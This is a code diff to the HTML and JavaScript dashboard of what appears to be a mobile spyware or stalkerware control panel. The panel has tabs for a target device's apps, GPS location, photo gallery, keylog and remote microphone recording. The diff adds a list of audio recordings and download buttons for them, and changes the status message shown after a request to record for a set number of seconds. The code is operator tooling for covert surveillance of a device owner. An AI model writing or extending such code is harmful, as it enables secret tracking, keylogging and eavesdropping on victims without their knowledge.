@@ -785,6 +785,11 @@ body {
         <div id="audioStatus" style="padding: 0 20px 20px 20px; color: #aaa; font-size: 14px;">
             No active recording.
         </div>
+        <!-- নতুন: অডিও ফাইলের তালিকা -->
+        <div id="audioListContainer" style="margin: 20px;">
+            <h3 style="margin-bottom:10px;">📁 Recorded Audio Files</h3>
+            <div id="audioList"></div>
+        </div>
     </section>
 
 </main>
@@ -1052,7 +1057,7 @@ function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel")
 function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
 function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; fetchGalleryPhotos(false); }
 function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("audioPanel").style.display = "none"; refreshKeylog(); }
-function showAudio(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "block"; }
+function showAudio(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "block"; loadAudioList(); }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
@@ -1125,13 +1130,41 @@ async function sendAudioRequest() {
         const data = await res.json();
         if (!res.ok) throw new Error(data.error || 'Failed');
         document.getElementById("audioStatus").innerHTML = 
-            `Recording requested for ${duration} seconds. Check server uploads/audio folder.`;
+            `Recording requested for ${duration} seconds. Check list below.`;
+        loadAudioList(); // লিস্ট রিফ্রেশ
     } catch (e) {
         document.getElementById("audioStatus").innerHTML = `Error: ${e.message}`;
     } finally {
         btn.disabled = false;
         btn.innerHTML = '🎙 Start Recording';
     }
+}
+
+// নতুন: অডিও ফাইল তালিকা লোড
+async function loadAudioList() {
+    const deviceId = getDeviceId();
+    const container = document.getElementById("audioList");
+    try {
+        const res = await fetch(`/api/audio/list?deviceId=${deviceId}`);
+        const data = await res.json();
+        if (data.files.length === 0) {
+            container.innerHTML = "No recordings yet.";
+            return;
+        }
+        container.innerHTML = data.files.map(file => `
+            <div style="background:#1a1214; border:1px solid #2d1d20; border-radius:10px; padding:12px; margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
+                <span>🎧 ${escapeHtml(file)}</span>
+                <button onclick="downloadAudio('${escapeHtml(file)}')" style="background:#ff3439; color:white; border:none; padding:6px 12px; border-radius:6px; cursor:pointer;">⬇ Download</button>
+            </div>
+        `).join("");
+    } catch (e) {
+        container.innerHTML = "Error loading audio list.";
+    }
+}
+
+// নতুন: অডিও ফাইল ডাউনলোড
+function downloadAudio(filename) {
+    window.location.href = `/api/audio/download/${encodeURIComponent(filename)}`;
 }
 
 // ================== AUTO REFRESH (5 SECONDS) ==================
